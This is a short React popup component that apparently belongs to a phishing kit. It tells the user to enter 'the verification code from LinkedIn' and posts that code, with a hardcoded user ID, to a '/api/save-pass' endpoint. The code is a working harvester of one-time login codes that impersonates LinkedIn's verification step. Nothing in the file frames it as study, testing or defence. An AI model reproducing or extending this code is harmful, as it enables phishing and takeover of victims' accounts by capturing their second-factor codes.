"use client";
import { useState } from "react";
import Input from "./input";
import Button from "./button";
import { useModalContext } from "../context/modal-context";

const Popup = () => {
  const [code, setCod] = useState("");
  const { closeModal } = useModalContext();

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const savingPass = await fetch("/api/save-pass", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          code,
          userId: "66912ddf65ef3fdd9771aab3"
        }),
      });

      if (!savingPass.ok) {
        const errorResponse = await savingPass.json();
        throw new Error(errorResponse.message || "Something went wrong");
      }
      closeModal()
    } catch (error) {
      console.log(error.message);
    }
  };

  return (
    <div className="w-[700px] p-[50px] flex flex-col gap-[20px]">
      <p className="text-center">
        Check your email and enter the verification code from LinkedIn
      </p>
      <form
        className="flex flex-col gap-8 items-center"
        onSubmit={handleSubmit}
      >
        <Input
          type="text"
          value={code}
          onChange={(e) => setCod(e.target.value)}
        />
        <Button className="btn-primary"type="submit">
          <p>Send Pass</p>{" "}
        </Button>
      </form>
    </div>
  );
};

export default Popup;
